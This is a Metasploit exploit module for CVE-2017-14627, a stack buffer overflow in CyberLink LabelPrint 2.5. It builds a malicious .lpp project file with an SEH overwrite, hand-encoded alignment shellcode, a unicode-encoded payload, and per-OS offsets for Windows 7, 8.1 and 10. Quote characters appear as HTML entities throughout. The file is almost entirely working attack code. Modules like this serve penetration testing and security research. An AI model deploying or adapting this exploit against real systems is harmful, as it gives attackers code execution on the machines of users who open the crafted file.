# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "CyberLink LabelPrint 2.5 Stack Buffer Overflow",
      &#039;Description&#039;    => %q{
        This module exploits a stack buffer overflow in CyberLink LabelPrint 2.5 and below.
        The vulnerability is triggered when opening a .lpp project file containing overly long string characters
        via open file menu. This results in overwriting a structured exception handler record and take over the
        application. This module has been tested on Windows 7 (64 bit), Windows 8.1 (64 bit), and Windows 10 (64 bit).
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;modpr0be <tom@spentera.id>&#039;,       # initial discovery and metasploit module
          &#039;f3ci <marie@spentera.id>&#039;          # unicode kungfu
        ],
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2017-14627&#039; ],
          [ &#039;EDB&#039;, &#039;42777&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;FILENAME&#039; => &#039;msf.lpp&#039;,
          &#039;EXITFUNC&#039; => &#039;seh&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Targets&#039;         =>
        [
          [&#039;CyberLink LabelPrint <= 2.5 on Windows 7 (64 bit)&#039;,
            {
              &#039;Ret&#039; => "\x2c\x44",
              &#039;Offset&#039; => 790,
              &#039;Padding1&#039; => 857,
              &#039;Padding2&#039; => 104
            }
          ],
          [&#039;CyberLink LabelPrint <= 2.5 on Windows 8.1 x64&#039;,
            {
              &#039;Ret&#039; => "\x2c\x44",
              &#039;Offset&#039; => 790,
              &#039;Padding1&#039; => 845,
              &#039;Padding2&#039; => 116
            }
          ],
          [&#039;CyberLink LabelPrint <= 2.5 on Windows 10 x64 build 1803&#039;,
            {
              &#039;Ret&#039; => "\x2c\x44",
              &#039;Offset&#039; => 790,
              &#039;Padding1&#039; => 781,
              &#039;Padding2&#039; => 180
            }
          ],
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 15000,
          &#039;DisableNops&#039; => true
        },
      &#039;DisclosureDate&#039;  => &#039;Sep 23 2017&#039;,
      &#039;DefaultTarget&#039;   => 0))
  end

  def get_payload(hunter)
    enc = framework.encoders.create(&#039;x86/unicode_mixed&#039;)
    enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;EAX&#039; })
    hunter = enc.encode(hunter, nil, nil, platform)
  end

  def exploit
    nop = "\x42"
    junk = &#039;ABC&#039;.split(&#039;&#039;).sample              #junk must specifically static (A, B, and C only)
    buffer = ""
    buffer << junk * target[&#039;Offset&#039;]
    buffer << "\x61\x42"       # nseh
    buffer << target[&#039;Ret&#039;]    # seh

    #we need to encode the RET address, since RET (\xc3) is known as bad char.
    buffer << nop              #nop/inc edx
    buffer << "\x54"           #push esp
    buffer << nop              #nop/inc edx
    buffer << "\x58"           #pop eax
    buffer << nop              #nop/inc edx
    buffer << "\x05\x1B\x01"   #add eax 01001B00
    buffer << nop              #nop/inc edx
    buffer << "\x2d\x01\x01"   #sub eax 01001000
    buffer << nop              #nop/inc edx
    buffer << "\x50"           #push eax
    buffer << nop              #nop/inc edx
    buffer << "\x5c"           #pop esp

    buffer << nop              #nop/inc edx
    buffer << "\x25\x7e\x7e"   #and eax,7e007e00
    buffer << nop              #nop/inc edx
    buffer << "\x25\x01\x01"   #and eax,01000100
    buffer << nop              #nop/inc edx
    buffer << "\x35\x7f\x7f"   #xor eax,7f007f00
    buffer << nop              #nop/inc edx
    buffer << "\x05\x44\x44"   #add eax,44004400
    buffer << nop              #nop/inc edx
    buffer << "\x57"           #push edi as padding, needed to align stack
    buffer << nop              #nop/inc edx
    buffer << "\x50"           #push eax
    buffer << junk * target[&#039;Padding1&#039;] #OS specific

    #custom venetian to reach shellcode
    buffer << "\x58"           #pop eax
    buffer << nop              #nop/inc edx
    buffer << "\x58"           #pop eax
    buffer << nop              #nop/inc edx
    buffer << "\x05\x09\x01"   #depending OS
    buffer << nop              #nop/inc edx
    buffer << "\x2d\x01\x01"   #add eax, 01000100, this will align eax to our buffer
    buffer << nop              #nop/inc edx
    buffer << "\x50"           #push eax
    buffer << nop              #nop/inc edx

    #crafting call esp at 0x7c32537b (MFC71U.dll) to make a jump using call esp
    buffer << "\x5C"           #pop esp
    buffer << nop              #nop/inc edx
    buffer << "\x58"           #pop eax
    buffer << nop              #nop/inc edx
    buffer << "\x05\x53\x7c"   #add eax 7c005300 part of call esp
    buffer << nop              #nop/inc edx
    buffer << "\x50"           #push eax
    buffer << junk * target[&#039;Padding2&#039;] #OS specific
    buffer << "\x7b\x32"       #part of call esp

    buffer << junk * 114       #junk
    buffer << "\x57"           #push edi
    buffer << nop              #nop/inc edx
    buffer << "\x58"           #pop eax
    buffer << nop              #nop/inc edx
    buffer << "\x05\x0A\x01"   #depending OS
    buffer << nop              #nop/inc edx
    buffer << "\x2d\x01\x01"   #sub eax,01000100
    buffer << nop              #nop/inc edx
    buffer << get_payload(payload.encoded)
    buffer << junk * (payload.space-buffer.length)      #fill the rest of buffer, must be added.

    lpp_data = <<-EOS
    <PROJECT version="1.0.00">
      <INFORMATION title="" author="" date="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}" SystemTime="#{rand(1..12)}/#{rand(1..28)}/#{(1970..2020).to_a.sample}">
        <TRACK name="#{buffer}" />
      </INFORMATION>
    </PROJECT>
    EOS

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(lpp_data)
  end
end

